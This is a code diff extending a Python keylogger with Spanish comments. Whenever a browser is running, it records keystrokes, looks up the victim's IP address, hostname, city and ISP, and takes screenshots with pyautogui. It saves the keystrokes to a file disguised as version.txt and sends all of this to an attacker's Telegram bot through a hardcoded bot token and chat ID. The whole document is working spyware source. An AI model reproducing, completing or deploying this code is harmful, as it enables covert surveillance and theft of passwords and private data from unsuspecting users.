@@ -6,12 +6,14 @@ import os
 import shutil
 import psutil
 from pathlib import Path
+import pyautogui
 
 ####################################### CREDENCIALES Y GLOBALES
 
-TOKEN = "TOKEN_TELEGRAM_BOT"
-CHAT_ID = "CHAT_ID"
-intervalo_minutos = 15
+TOKEN = "7705089492:AAFNPZ2jufblj91y4Q_XsB4KGKf_Q6sL_UE"
+CHAT_ID = "6814112276"
+
+intervalo_minutos = 10
 capturando = False
 previous_state = False
 browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "brave.exe"] # Lista de nombres de navegadores comunes (Windows)
@@ -43,19 +45,51 @@ def is_browser_open():
             return True
     return False
 
-########################################### HILOS Y TECLAS
+########################################### LO DIVERTIDO
 
-def enviar_telegram(mensaje):
-    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
+def obtenerDatos():
+    response = requests.get("https://json.ipv4.myip.wtf")
+    msg = ""
+    if response != False:
+        msg=f"IP: {response.json()['YourFuckingIPAddress']}\nHostName: {response.json()['YourFuckingHostname']}\nCity: {response.json()['YourFuckingLocation']}\nCountry: {response.json()['YourFuckingCountryCode']}\nISP: {response.json()['YourFuckingISP']}"
+    return msg
+
+def enviar_telegram(datos,file_path):
+    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
     data = {
-        'chat_id': CHAT_ID,
-        'text': mensaje
+        "chat_id": CHAT_ID,
+        "caption": datos
+    }
+    files = {
+        "document":open(file_path, 'rb')
     }
     try:
-        requests.post(url, data=data)
+        requests.post(url, data=data, files=files)
     except Exception as e:
         print("Error al enviar a Telegram:", e)
+        
 
+def enviar_captura():
+    path = os.path.join(os.environ['USERPROFILE'], 'Pictures', 'Temp.jpg')
+    imagen = pyautogui.screenshot()
+    imagen.save(path)
+
+    respuesta = None
+    URL = f"https://api.telegram.org/bot{TOKEN}/sendPhoto" 
+
+    try:
+        with open(path, "rb") as archivo:
+            files = {"photo": archivo}
+            data = {"chat_id": CHAT_ID}
+            respuesta = requests.post(URL, data=data, files=files)
+    except Exception as e:
+        print("Error al enviar la imagen:", e)
+
+    if respuesta and respuesta.status_code == 200:
+        os.remove(path)
+    else:
+        print("No se pudo enviar o eliminar la imagen.")
+  
 def capturar_teclas():
     global capturando
     if capturando:
@@ -76,12 +110,19 @@ def capturar_teclas():
                 teclas_capturadas.pop()  # Elimina el último carácter
 
     keyboard.on_press(registrar_tecla)
-    time.sleep(120)  # o 900 para 15 min
+    time.sleep(60)  # o 900 para 15 min
     keyboard.unhook_all()
     texto = "".join(teclas_capturadas)
+    datos = obtenerDatos()
     if texto.strip():
-        enviar_telegram("Teclas presionadas:\n" + texto)
+        file_dst = os.path.join(os.environ['USERPROFILE'], 'version.txt')
+        with open(file_dst, 'w') as f:
+            f.write("Teclas presionadas: \n" + texto)
+            f.close()
+        enviar_telegram(f"Datos del dispositivo:{datos}\n",file_dst)
+        enviar_captura()
         print("[INFO] FIN. TECLAS CAPTURADAS Y MENSAJE ENVIADO")
+        
     capturando = False
 
 def planificador():
@@ -92,8 +133,6 @@ def planificador():
             print("[+] Navegador abierto")
             capturar_teclas()
             time.sleep(intervalo_minutos * 60)
-        elif not current_state and previous_state:
-            print("[-] Navegador cerrado")
         previous_state = current_state
 
 if __name__ == "__main__":     
